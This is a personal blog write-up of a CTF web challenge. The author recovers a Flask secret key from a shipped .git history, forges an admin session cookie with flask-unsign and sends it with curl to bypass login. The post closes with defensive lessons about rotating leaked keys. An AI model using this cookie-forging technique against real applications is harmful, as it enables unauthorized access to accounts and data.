@@ -1,0 +1,218 @@
+---
+entry: '006'
+title: Forging A Session Cookie Out Of A Deleted Git Commit
+date: '2026-09-29'
+summary: 'A CTF challenge called procrastinator: a Flask app shipped with its .git directory, a secret key that was removed in a later commit but never actually gone, and the forged admin cookie that fell out of it.'
+tags: ['CTF', 'Git', 'Flask', 'Web', 'SFISSA']
+status: published
+---
+
+This was the first challenge I solved at SFISSA's Hack the Flag, and the first CTF challenge I
+ever worked start to finish. It is called **procrastinator**, and the description is the whole
+hint if you read it right:
+
+> A dusty archive holds more than old work. Go back far enough, and you'll find something that
+> was never meant to leave.
+
+I did not read it right at first. Here is the actual path, wrong turns included, because the
+wrong turns are most of what I learned.
+
+## Setup, and four ways to waste ten minutes
+
+I run Windows 11 with Kali on WSL, which means my Windows drive is mounted at `/mnt/c/`. The
+challenge handed me a zip in my Downloads folder. Four things went wrong before I had it open.
+
+**I tried to SSH into a web server.**
+
+```bash
+ssh 154.57.164.76:31944
+ssh: Could not resolve hostname: Name or service not known
+```
+
+Two problems in one line. `ssh` does not take `host:port`, the port goes in `-p`. And nothing
+said that instance was SSH in the first place. It was a web app. I had jumped to a tool before
+working out what I was even connecting to.
+
+**I ran `cp` with nowhere to copy to.**
+
+```bash
+cp /mnt/c/Users/lolhe/Downloads/a21bac90-....zip
+cp: missing destination file operand
+```
+
+`cp` is `cp <source> <destination>`. I gave it a source and stopped. The fix is a `.` on the end,
+meaning "into the folder I am standing in."
+
+**I was standing in `/mnt/c/windows/system32`.** Not dangerous in WSL, but a bad habit. Work in a
+scratch directory.
+
+**Then the one that actually cost me time.** I ran this:
+
+```bash
+unzip -l a21bac90-....zip
+```
+
+and then spent a while confused about why I could not `cd` into anything. `-l` means *list*. It
+prints what is inside the archive and extracts nothing at all. I had been reading a table of
+contents and treating it like a folder. The command I wanted was the same line without the flag.
+
+None of those four are interesting bugs. They are just what it looks like when you know what the
+tools do in the abstract and have not used them enough for the shapes to be automatic.
+
+## Recon
+
+Once it was actually extracted:
+
+```bash
+unzip a21bac90-....zip
+cd crypto_procrastinator
+ls -la
+```
+
+```
+build-docker.sh
+challenge/
+Dockerfile
+flag.txt
+requirements.txt
+```
+
+```bash
+cat flag.txt
+HTB{fake_flag_for_testing}
+```
+
+Placeholder, as expected. The real flag lives on the running instance, not in the files you are
+handed. Reading it anyway was still right, because now I know what the flag format looks like.
+
+A friend suggested gobuster at the site, so I ran it:
+
+```bash
+gobuster dir -u http://<instance> -w /usr/share/wordlists/dirb/common.txt
+```
+
+```
+dashboard   (Status: 405)
+login       (Status: 405)
+logout      (Status: 302) [--> /]
+```
+
+`405` is method not allowed, so those routes exist but refuse a plain GET. That tracks for a
+login that wants a POST. Useful, but not the thread. The thread was sitting on my disk already.
+
+## The thing that should not have shipped
+
+In the file listing, one directory does not belong in a packaged challenge:
+
+```
+crypto_procrastinator/challenge/application/.git/
+```
+
+A `.git` directory is the project's entire history. Every version of every file, including the
+ones that were later changed or deleted. "Go back far enough" stops being flavor text the moment
+you see it.
+
+There was a second tell. `requirements.txt` listed PyJWT, but nothing in the current code used
+it. A dependency with no caller usually means the code that needed it got rewritten, and the
+dependency was never cleaned up. Something used to be here.
+
+Reading `views.py` gave me the shape of the bug:
+
+- `login` refuses the literal username `admin`, but never checks a password against anything. It
+  sets `session['user']` to whatever you send.
+- `dashboard` checks `session['user'] == 'admin'` and hands over the flag if it matches.
+
+So I needed to be `admin` in the session without typing `admin` at the login form. Nothing in the
+current code lets you do that. The history is the only place left to look.
+
+## Going back
+
+```bash
+cd challenge/application
+git log
+```
+
+```
+commit 2982215 (HEAD -> main)
+    critical change :: read secret key from environment
+
+commit 9e336de
+    initial commit
+```
+
+Two commits, and that message is practically a confession. Somebody hardcoded a secret, then
+"fixed" it by reading it from the environment instead. So diff them:
+
+```bash
+git diff 9e336de 2982215
+```
+
+```diff
+-    app.secret_key = 'cb3dc3...' # TODO : remove hardcoded key from git repo
++    app.secret_key = os.environ.get('SECRET_KEY', 'dev')
+```
+
+There it is, `TODO` and all. I am truncating the key here on purpose, since the challenge may
+still be live for other people.
+
+## Why one key is the whole app
+
+Flask signs session cookies with `secret_key`. The cookie is not encrypted, it is *signed*: you
+can read it, but you cannot change it without producing a valid signature, and you cannot produce
+a valid signature without the key.
+
+So the key is not "one of the secrets." It is the thing that makes every session claim
+trustworthy. Anyone holding it can mint a session that says whatever they want, and the server
+has no way to tell the difference, because by its own rules there is no difference.
+
+```bash
+pipx install flask-unsign
+flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'cb3dc3...'
+```
+
+(`pip install` fails on Kali with `externally-managed-environment`. That is PEP 668, and `pipx`
+is the answer: it drops the tool in its own virtualenv and puts the binary on your PATH.)
+
+That prints a three part signed cookie. Then, rather than fighting browser dev tools to set a
+cookie by hand:
+
+```bash
+curl -X POST http://<instance>/dashboard --cookie "session=<forged cookie>"
+```
+
+`-X POST` because gobuster already told me `/dashboard` rejects GET. The server checked the
+signature, the signature was valid, so it believed the payload and handed over the flag.
+
+I never authenticated. I never touched the login form. I just told the server who I was in a
+language it had no way to doubt.
+
+## What I would actually take to work
+
+The real lesson is not the trick, it is the fix that isn't one.
+
+Commit two *looks* like remediation. The key is out of the source, it reads from the environment
+now, a reviewer skimming the diff would approve it. But a secret that has ever been committed is
+in the history forever, and removing it in a later commit changes nothing about that. The only
+real fix is to **rotate the key**, because the moment it hit a repo it stopped being a secret.
+Scrubbing history helps, and it is not sufficient on its own.
+
+Which turns into things worth doing:
+
+- Run `git log -p` over any repo you inherit, and grep the history, not just the working tree, for
+  keys and passwords. `git log -S'secret_key'` finds every commit that added or removed that
+  string.
+- Treat a shipped `.git` directory as a finding by itself. It is not just stale files, it is the
+  full history of everything the tree used to contain, and it is a very common accident in
+  deployed web roots.
+- Treat "removed hardcoded credential" in a commit message as a rotation ticket, not a closed one.
+- A dependency nothing imports is a clue that the code changed shape. Worth a look either way.
+
+That last part is why I am doing offensive challenges at all when the work I want is defensive.
+Nothing in this chain was exotic. `unzip`, `git log`, `git diff`, one signing tool, one `curl`.
+The failure was not a clever attack, it was a `TODO` comment that someone wrote down and meant to
+come back to. Hence the name.
+
+One note on honesty, since it matters more to me than looking good: I was being guided through
+this one. I ran every command myself and the wrong turns above are all mine, but I was not
+working it out alone, and the write-up of that is
+[here](/blog/005-first-ctf).
